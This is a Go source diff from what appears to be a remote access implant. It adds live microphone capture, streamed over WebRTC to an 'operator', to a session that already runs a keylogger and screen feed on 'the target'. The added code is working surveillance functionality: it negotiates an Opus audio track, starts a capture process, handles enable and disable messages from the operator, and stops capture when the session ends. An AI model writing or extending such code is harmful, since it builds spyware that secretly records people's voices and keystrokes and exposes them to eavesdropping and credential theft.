@@ -65,6 +65,10 @@ type webRTCSettings struct {
 	// (mpdecimate), so a static desktop stops costing a full frame rate while
 	// every changed frame is still sent.
 	Differential bool `json:"differential"`
+	// Audio streams the target's microphone (or the first capture device) as
+	// Opus on the same peer connection. The track is always negotiated; this
+	// flag only controls whether a capture process is running.
+	Audio bool `json:"audio"`
 }
 
 type webRTCAgentStartData struct {
@@ -140,6 +144,14 @@ type agentWebRTCSession struct {
 	clipMu       sync.Mutex
 	clipWatch    bool
 	clipLastHash string
+
+	// Live audio: the Opus track is always negotiated so enabling audio later
+	// needs no renegotiation; audioCmd is the capture process, when running.
+	audioMu    sync.Mutex
+	audioTrack *webrtc.TrackLocalStaticRTP
+	audioCmd   *exec.Cmd
+	audioConn  *net.UDPConn
+	audioGen   int
 
 	// Live keystroke feed: stream new keylog bytes to the operator while the
 	// feed is on. keyStartedHere records whether THIS session started the
@@ -363,6 +375,21 @@ func (s *agentWebRTCSession) connect(data webRTCAgentStartData) error {
 		}
 	}()
 
+	// Audio track: negotiated unconditionally so the console always has an
+	// audio m-line. Without a capture process it simply carries no packets.
+	audioTrack, err := webrtc.NewTrackLocalStaticRTP(webrtc.RTPCodecCapability{
+		MimeType:  webrtc.MimeTypeOpus,
+		ClockRate: audioSampleRate,
+		Channels:  1,
+	}, "audio", "desktop")
+	if err != nil {
+		return fmt.Errorf("audio track: %w", err)
+	}
+	s.audioTrack = audioTrack
+	if _, err := pc.AddTrack(audioTrack); err != nil {
+		return fmt.Errorf("add audio track: %w", err)
+	}
+
 	pc.OnICECandidate(func(c *webrtc.ICECandidate) {
 		if c == nil || s.ctx.Err() != nil {
 			return
@@ -377,6 +404,13 @@ func (s *agentWebRTCSession) connect(data webRTCAgentStartData) error {
 			// first IDR (and its SPS/PPS) is dropped by the track and the
 			// browser shows black until the next keyframe.
 			go s.ensurePipeline()
+			if s.settingsSnapshot().Audio {
+				go func() {
+					if err := s.startAudioPipeline(); err != nil {
+						_ = s.sendJSON(map[string]any{"type": "audio", "enabled": false, "reason": err.Error()})
+					}
+				}()
+			}
 		case webrtc.PeerConnectionStateFailed:
 			_ = s.sendJSON(map[string]any{"type": "error", "reason": "WebRTC connection failed"})
 			go s.stop("connection failed")
@@ -771,6 +805,11 @@ func (s *agentWebRTCSession) readLoop() {
 				continue
 			}
 			s.setDifferential(*msg.Enabled)
+		case "audio":
+			if msg.Enabled == nil {
+				continue
+			}
+			s.setAudio(*msg.Enabled)
 		case "stop", "session_end":
 			return
 		}
@@ -897,6 +936,7 @@ func (s *agentWebRTCSession) stop(reason string) {
 	s.stopOnce.Do(func() {
 		// The live keystroke feed owns the keylogger only if it started it.
 		s.setKeyFeed(false)
+		s.stopAudio()
 		webRTCSessionMu.Lock()
 		if webRTCSessionActive == s {
 			webRTCSessionActive = nil
